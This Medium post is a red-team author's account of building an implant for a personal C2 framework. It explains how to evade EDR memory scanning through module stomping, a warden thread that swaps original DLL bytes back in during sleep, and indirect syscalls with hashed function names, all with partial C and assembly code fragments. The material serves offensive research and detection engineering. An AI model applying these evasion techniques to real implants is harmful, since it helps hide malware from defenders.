# https://medium.com/@q3alique/blending-in-why-encrypt-everything-makes-you-more-visible-ae88ea420529

[Sitemap](https://medium.com/sitemap/sitemap.xml)

[Open in app](https://play.google.com/store/apps/details?id=com.medium.reader&referrer=utm_source%3DmobileNavBar&source=---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40q3alique%2Fblending-in-why-encrypt-everything-makes-you-more-visible-ae88ea420529&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=---top_nav_layout_nav-----------------------------------------)

Get app

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40q3alique%2Fblending-in-why-encrypt-everything-makes-you-more-visible-ae88ea420529&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![Unknown user](https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png)

[![Qalique](https://miro.medium.com/v2/resize:fill:40:40/1*WGk2sfPffpXmEMyc65S3ew.jpeg)](https://medium.com/@q3alique?source=post_page---post_author_sidebar--ae88ea420529-----------------fab1a67c8ef9----------------------)

## Qalique

Follow writer

Edr

Evasion

Red Team

Cybersecurity

Windows

# Blending In: Why “Encrypt Everything” Makes You More Visible

[![Qalique](https://miro.medium.com/v2/resize:fill:32:32/1*WGk2sfPffpXmEMyc65S3ew.jpeg)](https://medium.com/@q3alique?source=post_page---byline--ae88ea420529---------------------------------------)

[Qalique](https://medium.com/@q3alique?source=post_page---byline--ae88ea420529---------------------------------------)

Follow

8 min read

·

Jun 28, 2026

1

[Listen](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2Fplans%3Fdimension%3Dpost_audio_button%26postId%3Dae88ea420529&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40q3alique%2Fblending-in-why-encrypt-everything-makes-you-more-visible-ae88ea420529&source=---header_actions--ae88ea420529---------------------post_audio_button------------------)

Share

A few months ago I set out to build my own C2 framework , **Lethe**, as a personal research project. My goal was not to reinvent the wheel but to understand, from first principles, how modern command-and-control implants work and where they fail.

The deeper I went, the more one question kept surfacing: _why do implants get caught?_ Not the obvious reasons , bad OPSEC, burned infrastructure, noisy lateral movement, but the more fundamental question: why does a piece of code sitting in memory get detected even when no network activity is happening, even when no suspicious API has been called, even when the binary never touched disk?

The answer forced me to challenge a piece of conventional wisdom that is repeated everywhere in offensive security:

> “Shellcode should live only in memory and should stay fully encrypted.”

This sounds like solid advice. It feels right. But as I worked through the implementation of Wraith, Lethe’s Windows implant , I discovered that this model, taken to its logical extreme, produces something that looks nothing like a legitimate application and everything like exactly what it is.

This article is about that contradiction, and about the alternative: blending.

## The Traditional Model and Its Paradox

**The classic approach** to in-memory evasion has a clear mental model:

1. Drop no files to disk.
2. Keep shellcode encrypted in memory at rest.
3. Decrypt only at execution time, immediately re-encrypt afterward.
4. Minimize your import table and API footprint.

Each of these steps is individually reasonable. Together, however, they produce a memory profile that any modern EDR can identify at a glance.

Here is what that memory region looks like to a tool like `pe-sieve`, `Moneta`, or an EDR doing runtime memory introspection:

```
BaseAddress:  0x00001F3A00000000
RegionSize:   0x18000
State:        MEM_COMMIT
Protect:      PAGE_EXECUTE_READ
Type:         MEM_PRIVATE          ← no backing file
Content:      [high entropy blob]  ← ~7.9 bits/byte
```

The problem is that no legitimate Windows application looks like this.

When Windows loads a DLL, it does not allocate private heap memory and copy bytes into it. It creates a memory-mapped view of the file on disk , a `SEC_IMAGE` section. The kernel tracks the backing file. The content is predictable. The entropy is moderate. `VirtualQuery` returns `MEM_IMAGE`, not `MEM_PRIVATE`.

The “ **encrypt everything, stay in memory**” model optimizes against forensic disk analysis , an attacker model from a different era. What it exposes instead is an anomaly in the _live memory profile_ of a running process that modern EDRs scan continuously.

## What Legitimate Memory Looks Like

To understand why blending works, you need to internalize what a security tool sees when it scans a healthy process.

Every loaded DLL in a Windows process has three properties that are simultaneously true:

**1\. It is memory-mapped from a file.**

The region is backed by a file on disk. An EDR can open that file and compare its content to what is in memory.

**2\. Its content matches the file on disk.**

The in-memory bytes of `.text` are (under normal circumstances) the same as the bytes in the corresponding section of the DLL file. Any discrepancy is a signal.

**3\. Its entropy reflects real code.**

x86/x64 instruction sequences, string tables, and import data produce entropy in the 5.0–6.5 bits/byte range. Encrypted or random data produces entropy near 8.0 bits/byte.

A shellcode blob injected into private memory fails all three tests simultaneously. It is the digital equivalent of wearing a disguise while standing in a spotlight.

The blending approach asks a different question: _what if the malicious region passed all three tests?_

## The Blending Approach

Blending is not a single technique. It is a design philosophy: at every moment in the implant’s lifecycle, the memory it occupies should be indistinguishable from memory that belongs to a legitimate loaded module.

This creates a direct tension with traditional evasion:

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*YqBPwJIeV_xAU6gqJMvTHg.png)

The blending model accepts a tradeoff: the implant code is briefly exposed _while it is executing_. In exchange, during the statistically dominant state , sleep, waiting for a task , it is invisible.

This is the model Wraith implements.

## Implementation: Module Stomping

The foundation of Wraith’s blending is module stomping. Rather than allocating private memory for the implant, Wraith overwrites the `.text` section of a legitimate DLL that is already loaded in the process.

## Get Qalique’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Subscribe

Remember me for faster sign in

At startup, Wraith selects a decoy DLL , a system library that is already present, rarely inspected, and has a `.text` section large enough to hold the agent code:

```
// Candidate decoy DLLs — names built on the stack,
// never stored as plaintext strings in .rodata
static const char candidates[][20] = {
    {'c','l','b','c','a','t','q','.','d','l','l',0},
    {'c','r','y','p','t','b','a','s','e','.','d','l','l',0},
    {'v','e','r','.','d','l','l',0},
    // ...
};
```

For each candidate, Wraith maps a fresh copy of the DLL (preferring `\KnownDlls\` to avoid disk reads), locates its `.text` section, and checks whether it is large enough:

```
// Map a clean view of the decoy via KnownDlls (no disk I/O)
HANDLE section = NULL;
NtOpenSection(&section, SECTION_MAP_READ | SECTION_MAP_EXECUTE,
              &object_attrs);

PVOID view = NULL;
NtMapViewOfSection(section, current_process, &view, ...);

// Find and measure the .text section
PVOID text_start;
SIZE_T text_size;
find_text_section(view, &text_start, &text_size);

if (text_size >= agent_size) {
    // This decoy fits — save its original bytes
    memcpy(original_bytes, text_start, text_size);
}
```

Two copies are saved to the heap: the original DLL bytes and the agent bytes. The memory region itself , now containing the agent code , is still typed `MEM_IMAGE`, still appears backed by the decoy DLL file, and still has an RX protection flag. From the outside, it is indistinguishable from a legitimately loaded module.

## Implementation: The Sleep Cycle and the Warden Thread

Module stomping solves the static memory signature problem. But there is a window during which the agent code is actually present in that region: while it is executing.

The moment the beacon thread goes to sleep , the long idle period between check-ins , is exactly when EDRs are most likely to perform a memory scan. Wraith addresses this with a warden thread that performs a coordinated swap.

The mechanism uses two NT events for synchronization between the beacon thread and the warden:

```
beacon thread                    warden thread
─────────────────                ─────────────────
signal: "going to sleep" ──────►
                                 restore original DLL bytes → .text
                                 set protection: RX
                                 wait: "wake me when you return" ◄──
NtDelayExecution(sleep_ms)
signal: "I'm awake" ──────────►
                                 restore agent bytes → .text
                                 set protection: RX
                                 signal: "ready" ──────────────────►
◄────────────────────────────── receive: "safe to execute"
continue beacon loop
```

The warden thread implementation:

```
// Warden waits for the beacon to signal sleep
NtWaitForSingleObject(event_sleep, FALSE, &timeout);

// Swap in original DLL bytes — scanner now sees clean memory
ULONG old_protect;
NtProtectVirtualMemory(current_process, &region_base, &region_size,
                       PAGE_READWRITE, &old_protect);
memcpy(stomped_region, original_dll_bytes, region_size);
NtProtectVirtualMemory(current_process, &region_base, &region_size,
                       PAGE_EXECUTE_READ, &old_protect);

// Wait for beacon to wake
NtWaitForSingleObject(event_wake, FALSE, NULL);

// Restore agent code for execution
NtProtectVirtualMemory(current_process, &region_base, &region_size,
                       PAGE_READWRITE, &old_protect);
memcpy(stomped_region, agent_bytes, region_size);
NtProtectVirtualMemory(current_process, &region_base, &region_size,
                       PAGE_EXECUTE_READ, &old_protect);

NtSetEvent(event_sleep, NULL); // Signal: safe to run
```

During the sleep window , which, with a 5-second sleep and 10% jitter, represents roughly 99.9% of the implant’s total runtime , a memory scanner sees:

```
BaseAddress:  [stomped region]
Type:         MEM_IMAGE
Protect:      PAGE_EXECUTE_READ
Content:      [original clbcatq.dll .text bytes]
Entropy:      ~5.4 bits/byte
Disk match:   YES
```

**_There is nothing to flag_**.

An important edge case worth noting: this technique only works when the agent lives inside a _different_ PE’s memory range. If the agent is running as a standalone EXE and stomps its own `.text`, the warden thread's `memcpy` call , which lives in that same `.text`gets overwritten before it can complete. Wraith skips sleep masking entirely in standalone EXE mode for this reason.

## Implementation: Indirect Syscalls . Blending at the API Layer

Blending is not only about memory content. EDRs also monitor _how_ code makes system calls.

The standard approach to evading API hooks is to call NT functions directly. But a naive direct syscall , placing the `syscall` instruction inside the implant's own code , creates another anomaly: the kernel's call stack record shows a `syscall` originating from a private, file-unbacked region.

Wraith’s approach is indirect syscalls: the `syscall` instruction is never executed from Wraith's code. Instead, Wraith resolves a `syscall; ret` gadget inside ntdll's own `.text` and jumps to it:

```
// Locate the first "syscall; ret" (0F 05 C3) in ntdll .text
BYTE *scan = ntdll_text_section;
for (size_t i = 0; i < text_size - 2; i++) {
    if (scan[i] == 0x0F && scan[i+1] == 0x05 && scan[i+2] == 0xC3) {
        gadget = &scan[i];
        break;
    }
}
```

Each syscall stub then becomes:

```
; Windows x64 syscall convention: arg1 in R10, SSN in EAX
mov  r10, rcx
mov  eax, [g_ssn_NtAllocateVirtualMemory]
jmp  [g_gadget]           ; jump into ntdll's syscall;ret
```

The call stack at the point of the `syscall` instruction shows it originating from ntdll, which is correct, legitimate, and expected. The SSN (syscall number) is resolved at runtime using Halos Gate: if a target function is hooked, Wraith walks neighboring exports in the sorted ordinal table and derives the correct SSN from an unhooked neighbor.

Function names never appear in the binary either. All resolution happens by DJB2 hash, computed at build time and embedded as integer literals:

```
// No string "NtAllocateVirtualMemory" anywhere in the binary.
// Hash computed by the build tool and substituted before compilation.
{ 0xA1B2C3D4UL, &g_ssn_NtAllocateVirtualMemory },
{ 0xE5F60718UL, &g_ssn_NtCreateThreadEx        },
// ...
```

## The Detection Surface in Practice

Putting it together, here is what a memory scanner sees at each phase of the Wraith beacon loop:

While sleeping (>99% of runtime):

```
Region type:    MEM_IMAGE
Protection:     PAGE_EXECUTE_READ
Content:        Original decoy DLL bytes
Entropy:        5.0 – 6.5 bits/byte
Disk match:     Yes (original bytes restored before sleep)
Syscall origin: N/A (not executing)
```

While executing (beacon loop iteration):

```
Region type:    MEM_IMAGE
Protection:     PAGE_EXECUTE_READ
Content:        Agent code (x64 instructions — moderate entropy)
Disk match:     No (content diverges from decoy DLL)
Syscall origin: ntdll .text (via gadget jump)
```

The detection window is narrow and unavoidable, the agent must execute to do anything. But the exposure is brief, and the agent code itself (raw x64 instructions) does not carry the high-entropy signature of encrypted data. The critical insight is that **encryption is not the same as legitimacy**. Encrypting your shellcode at rest raises entropy and eliminates file backing. Replacing it with real DLL bytes does the opposite.

## Closing Thoughts

The conventional wisdom, encrypt everything, stay in memory, expose nothing, made sense in an era when EDRs did static file scanning and memory analysis was rare. Modern EDR products do continuous memory introspection, call-stack analysis, and entropy-aware scanning. In that environment, **maximum encryption produces maximum anomaly**.

Blending inverts the model. Rather than asking _how do I hide this?_, it asks **_how do I make this look like something that belongs here?_** The answer requires understanding what legitimate Windows memory actually looks like, file-backed, moderately entropic, mapped rather than private , and building an implant that matches those properties at every phase of its lifecycle.

Wraith’s module stomping, warden-thread sleep masking, and indirect syscall model are each an answer to a different dimension of that question. None of them are magic. Each one closes a gap that the traditional “encrypt everything” model leaves open.

The lesson from building Lethe is that detection **evasion is not primarily a cryptography problem. It is a mimicry problem**.

Edr

Evasion

Red Team

Cybersecurity

Windows

[![Qalique](https://miro.medium.com/v2/resize:fill:48:48/1*WGk2sfPffpXmEMyc65S3ew.jpeg)](https://medium.com/@q3alique?source=post_page---post_author_info--ae88ea420529---------------------------------------)

[![Qalique](https://miro.medium.com/v2/resize:fill:64:64/1*WGk2sfPffpXmEMyc65S3ew.jpeg)](https://medium.com/@q3alique?source=post_page---post_author_info--ae88ea420529---------------------------------------)

Follow

[**Written by Qalique**](https://medium.com/@q3alique?source=post_page---post_author_info--ae88ea420529---------------------------------------)

[2 followers](https://medium.com/@q3alique/followers?source=post_page---post_author_info--ae88ea420529---------------------------------------)

· [7 following](https://medium.com/@q3alique/following?source=post_page---post_author_info--ae88ea420529---------------------------------------)

Follow

[Help](https://help.medium.com/hc/en-us?source=post_page-----ae88ea420529---------------------------------------)

[Status](https://status.medium.com/?source=post_page-----ae88ea420529---------------------------------------)

[About](https://medium.com/about?autoplay=1&source=post_page-----ae88ea420529---------------------------------------)

[Careers](https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----ae88ea420529---------------------------------------)

[Press](mailto:pressinquiries@medium.com)

[Blog](https://blog.medium.com/?source=post_page-----ae88ea420529---------------------------------------)

[Store](https://medium.com/store)

[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----ae88ea420529---------------------------------------)

[Rules](https://policy.medium.com/medium-rules-30e5502c4eb4?source=post_page-----ae88ea420529---------------------------------------)

[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----ae88ea420529---------------------------------------)

[Text to speech](https://speechify.com/medium?source=post_page-----ae88ea420529---------------------------------------)